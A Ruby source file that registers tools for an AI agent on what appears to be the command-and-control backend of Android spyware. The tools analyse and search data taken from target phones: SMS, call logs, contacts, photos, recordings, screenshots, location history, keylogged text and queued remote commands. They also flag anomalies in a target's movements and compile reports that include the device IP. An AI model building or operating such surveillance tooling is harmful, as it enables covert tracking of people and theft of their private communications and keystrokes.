# frozen_string_literal: true

module Mcp
  module Tools
    class AnalysisTools
      def initialize(server)
        @server = server
      end

      def register
        register_analyze_behavior
        register_detect_anomalies
        register_generate_report
        register_get_timeline
        register_search_data
      end

      private

      def register_analyze_behavior
        @server.register_tool(
          name: 'analyze_behavior',
          description: 'Analyze device usage behavior patterns including app usage, activity times, and communication patterns.',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' },
              days: { type: 'integer', description: 'Analysis period in days (default: 7)', default: 7 }
            },
            required: ['device_id']
          },
          scope: 'analysis:read'
        ) do |args|
          device = find_device!(args[:device_id])
          days = [args[:days] || 7, 1].max
          since = days.days.ago

          analysis = {
            device_id: device.device_id,
            period_days: days,
            activity: {
              total_commands: device.pending_commands.where('created_at >= ?', since).count,
              total_locations: device.geo_locations.where('created_at >= ?', since).count,
              total_sms: device.sms_messages.where('created_at >= ?', since).count,
              total_calls: device.call_logs.where('created_at >= ?', since).count
            },
            daily_activity: device.pending_commands
              .where('created_at >= ?', since)
              .group("DATE(created_at)")
              .count
              .transform_keys(&:to_s),
            location_count_by_day: device.geo_locations
              .where('created_at >= ?', since)
              .group("DATE(created_at)")
              .count
              .transform_keys(&:to_s)
          }

          if defined?(KeylogAnalyticsService) && device.respond_to?(:keylogs)
            keylog_data = device.keylogs.where('created_at >= ?', since)
            analysis[:keylog_stats] = {
              total_entries: keylog_data.count,
              unique_apps: keylog_data.select(:app_name).distinct.count
            }
          end

          { content: [{ type: 'text', text: analysis.to_json }] }
        end
      end

      def register_detect_anomalies
        @server.register_tool(
          name: 'detect_anomalies',
          description: 'Detect unusual patterns such as unexpected location changes, off-hours activity, or communication spikes.',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' },
              days: { type: 'integer', description: 'Analysis window in days (default: 7)', default: 7 }
            },
            required: ['device_id']
          },
          scope: 'analysis:read'
        ) do |args|
          device = find_device!(args[:device_id])
          days = [args[:days] || 7, 1].max
          since = days.days.ago
          anomalies = []

          # Detect activity gaps > 24 hours
          if device.last_activity_at.present? && device.last_activity_at < 24.hours.ago
            anomalies << {
              type: 'inactivity',
              severity: 'warning',
              message: "Device inactive for #{((Time.current - device.last_activity_at) / 3600).round} hours"
            }
          end

          # Detect location jumps (> 100km between consecutive points)
          locations = device.geo_locations.where('created_at >= ?', since).order(:created_at)
          locations.each_cons(2) do |a, b|
            distance = haversine_km(a.latitude, a.longitude, b.latitude, b.longitude)
            time_diff = (b.created_at - a.created_at).abs
            if distance > 100 && time_diff < 1.hour
              anomalies << {
                type: 'location_jump',
                severity: 'high',
                message: "#{distance.round}km jump in #{(time_diff / 60).round} minutes",
                from: { lat: a.latitude, lng: a.longitude, at: a.created_at.iso8601 },
                to: { lat: b.latitude, lng: b.longitude, at: b.created_at.iso8601 }
              }
            end
          end

          # Detect command spikes (> 3x daily average)
          daily_counts = device.pending_commands
            .where('created_at >= ?', since)
            .group("DATE(created_at)")
            .count
          if daily_counts.any?
            avg = daily_counts.values.sum.to_f / daily_counts.size
            daily_counts.each do |date, count|
              if avg > 0 && count > avg * 3
                anomalies << { type: 'command_spike', severity: 'medium', message: "#{count} commands on #{date} (avg: #{avg.round(1)})" }
              end
            end
          end

          {
            content: [{
              type: 'text',
              text: {
                device_id: device.device_id,
                period_days: days,
                anomalies: anomalies,
                anomaly_count: anomalies.size
              }.to_json
            }]
          }
        end
      end

      def register_generate_report
        @server.register_tool(
          name: 'generate_report',
          description: 'Generate a comprehensive device report combining status, data counts, and recent activity.',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' },
              report_type: { type: 'string', enum: %w[summary detailed security], description: 'Report type', default: 'summary' }
            },
            required: ['device_id']
          },
          scope: 'analysis:read'
        ) do |args|
          device = find_device!(args[:device_id])
          installation = device.apk_installation

          report = {
            generated_at: Time.current.iso8601,
            device: {
              device_id: device.device_id,
              name: device.name,
              online: device.last_activity_at.present? && device.last_activity_at > 5.minutes.ago,
              last_activity: device.last_activity_at&.iso8601,
              battery: installation&.battery_level,
              ip: installation&.target_ip
            },
            data_summary: {
              sms_messages: device.sms_messages.count,
              call_logs: device.call_logs.count,
              contacts: device.contacts.count,
              pictures: device.pictures.count,
              locations: device.geo_locations.count,
              keylogs: device.keylogs_count,
              recordings: device.recordings.count,
              screenshots: device.screenshots.count
            },
            recent_activity: {
              last_location: device.geo_locations.order(created_at: :desc).first&.then { |l|
                { lat: l.latitude, lng: l.longitude, at: l.created_at.iso8601 }
              },
              pending_commands: device.pending_commands.active.count,
              recent_commands: device.pending_commands.order(created_at: :desc).limit(5).map { |c|
                { command: c.command, status: c.status, at: c.created_at.iso8601 }
              }
            }
          }

          if args[:report_type] == 'detailed' || args[:report_type] == 'security'
            report[:scheduled_commands] = device.scheduled_commands.where(active: true).map { |sc|
              { id: sc.id, command: sc.command, cron: sc.cron_expression }
            }
          end

          { content: [{ type: 'text', text: report.to_json }] }
        end
      end

      def register_get_timeline
        @server.register_tool(
          name: 'get_timeline',
          description: 'Get a chronological timeline of all device events (commands, data, locations) within a time range.',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' },
              since: { type: 'string', description: 'ISO 8601 start time (default: 24h ago)' },
              until: { type: 'string', description: 'ISO 8601 end time (default: now)' },
              limit: { type: 'integer', description: 'Max events (default: 50)', default: 50 }
            },
            required: ['device_id']
          },
          scope: 'analysis:read'
        ) do |args|
          device = find_device!(args[:device_id])
          since_time = args[:since].present? ? Time.parse(args[:since]) : 24.hours.ago
          until_time = args[:until].present? ? Time.parse(args[:until]) : Time.current
          limit = [[args[:limit] || 50, 1].max, McpConfig.max_results].min

          events = []

          device.pending_commands.where(created_at: since_time..until_time).find_each do |c|
            events << { type: 'command', name: c.command, status: c.status, at: c.created_at }
          end

          device.geo_locations.where(created_at: since_time..until_time).find_each do |l|
            events << { type: 'location', lat: l.latitude, lng: l.longitude, at: l.created_at }
          end

          device.sms_messages.where(created_at: since_time..until_time).find_each do |s|
            events << { type: 'sms', filename: s.filename, at: s.created_at }
          end

          device.pictures.where(created_at: since_time..until_time).find_each do |p|
            events << { type: 'photo', filename: p.filename, at: p.created_at }
          end

          sorted = events.sort_by { |e| e[:at] }.reverse.first(limit)
          sorted.each { |e| e[:at] = e[:at].iso8601 }

          {
            content: [{
              type: 'text',
              text: {
                device_id: device.device_id,
                from: since_time.iso8601,
                to: until_time.iso8601,
                events: sorted,
                total_events: events.size
              }.to_json
            }]
          }
        end
      end

      def register_search_data
        @server.register_tool(
          name: 'search_data',
          description: 'Search across all device data types (SMS, calls, keylogs, etc.) for a keyword or pattern.',
          input_schema: {
            type: 'object',
            properties: {
              query: { type: 'string', description: 'Search query' },
              device_id: { type: 'string', description: 'Optional: limit to a specific device' },
              data_type: { type: 'string', enum: %w[sms calls contacts keylogs all], description: 'Data type to search', default: 'all' },
              limit: { type: 'integer', description: 'Max results (default: 25)', default: 25 }
            },
            required: ['query']
          },
          scope: 'analysis:read'
        ) do |args|
          query = args[:query].to_s.strip
          limit = [[args[:limit] || 25, 1].max, McpConfig.max_results].min
          results = []

          scope = args[:device_id].present? ? Smartphone.where(device_id: args[:device_id]) : Smartphone.all

          scope.find_each do |device|
            if %w[sms all].include?(args[:data_type] || 'all')
              device.sms_messages.where('filename ILIKE ?', "%#{query}%").limit(limit).each do |m|
                results << { type: 'sms', device_id: device.device_id, id: m.id, filename: m.filename, at: m.created_at.iso8601 }
              end
            end

            if %w[contacts all].include?(args[:data_type] || 'all')
              device.contacts.where('filename ILIKE ?', "%#{query}%").limit(limit).each do |c|
                results << { type: 'contact', device_id: device.device_id, id: c.id, filename: c.filename, at: c.created_at.iso8601 }
              end
            end

            if %w[keylogs all].include?(args[:data_type] || 'all') && device.respond_to?(:keylogs)
              device.keylogs.where('content ILIKE ? OR app_name ILIKE ?', "%#{query}%", "%#{query}%").limit(limit).each do |k|
                results << { type: 'keylog', device_id: device.device_id, id: k.id, app: k.try(:app_name), at: k.created_at.iso8601 }
              end
            end
          end

          {
            content: [{
              type: 'text',
              text: {
                query: query,
                results: results.first(limit),
                total: results.size
              }.to_json
            }]
          }
        end
      end

      # --- Helpers ---

      def find_device!(device_id)
        Smartphone.find_by!(device_id: device_id)
      rescue ActiveRecord::RecordNotFound
        raise McpServer::ToolNotFoundError, "Device not found: #{device_id}"
      end

      def haversine_km(lat1, lon1, lat2, lon2)
        r = 6371.0
        dlat = to_rad(lat2 - lat1)
        dlon = to_rad(lon2 - lon1)
        a = Math.sin(dlat / 2)**2 + Math.cos(to_rad(lat1)) * Math.cos(to_rad(lat2)) * Math.sin(dlon / 2)**2
        r * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
      end

      def to_rad(deg)
        deg * Math::PI / 180.0
      end
    end
  end
end
